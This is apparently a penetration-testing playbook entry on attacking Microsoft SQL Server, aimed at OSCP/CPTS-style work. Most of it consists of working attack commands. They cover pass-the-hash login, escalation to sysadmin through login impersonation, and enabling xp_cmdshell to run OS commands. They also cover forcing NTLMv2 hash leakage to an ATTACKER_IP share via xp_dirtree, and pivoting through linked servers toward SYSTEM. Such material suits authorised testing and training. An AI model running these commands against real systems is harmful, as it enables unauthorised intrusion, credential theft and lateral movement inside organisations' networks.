---
id: mssql-enum
title: MSSQL Enumeration
stage: enumeration
tags: [windows, mssql]
summary: Connect to MSSQL, escalate to sysadmin via impersonation, and execute OS commands — SQL Server service accounts almost always have SeImpersonatePrivilege.
leads_to:
  - public-exploit
  - sqli-rce
  - rev-shell
  - password-spray
  - mssql-privesc
---

## Prerequisites

Port 1433 open (or non-standard port from nmap). Domain credentials, SQL credentials, or NT hash — all work. `sa` with no password is still common on unpatched installs.

MSSQL is one of the highest-value services in Windows environments. Even with a low-privilege SQL user, impersonation (`EXECUTE AS LOGIN`) frequently escalates to sysadmin. Sysadmin means `xp_cmdshell` → OS commands as the SQL service account → `SeImpersonatePrivilege` is almost guaranteed → GodPotato → SYSTEM. This is one of the most reliable OSCP/CPTS paths.

## Quick Win

> Connect with Windows auth — domain credentials often have SQL access.

```bash
mssqlclient.py -windows-auth $DOMAIN/user:password@$TARGET
```

## Connection Options

> Three auth modes — try Windows auth first in domain environments.

```bash
# SQL auth
mssqlclient.py $TARGET -U sa -P password

# Pass-the-hash
mssqlclient.py -windows-auth $DOMAIN/user@$TARGET -hashes :NTLM_HASH
```

## Escalate to Sysadmin via Impersonation

> Find accounts you can impersonate — `sa` or any sysadmin member gives you the keys.

```sql
-- Who can you impersonate?
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa and confirm
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 = success
```

## xp_cmdshell → OS Command Execution

> Enable the shell and run OS commands as the SQL service account.

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';   -- SeImpersonatePrivilege here → GodPotato
```

## Steal NTLMv2 Hash (if xp_cmdshell blocked)

> Force the server to authenticate outbound — capture the hash with Responder.

```sql
-- Start Responder first: sudo responder -I tun0
EXEC xp_dirtree '\\ATTACKER_IP\share';
EXEC xp_fileexist '\\ATTACKER_IP\share\test';
```

## Linked Servers (Lateral Movement)

> SQL servers often trust each other — pivot to a linked server with higher privileges.

```sql
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
-- Run commands on linked server:
EXEC ('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [linkedserver\instance]
```

## Leads To

xp_cmdshell enabled → whoami shows service account → check `whoami /priv` → if SeImpersonatePrivilege present, go directly to token-impersonation (GodPotato → SYSTEM). Hash capture via xp_dirtree → crack or relay. Linked server with higher rights → repeat escalation chain on the linked server.
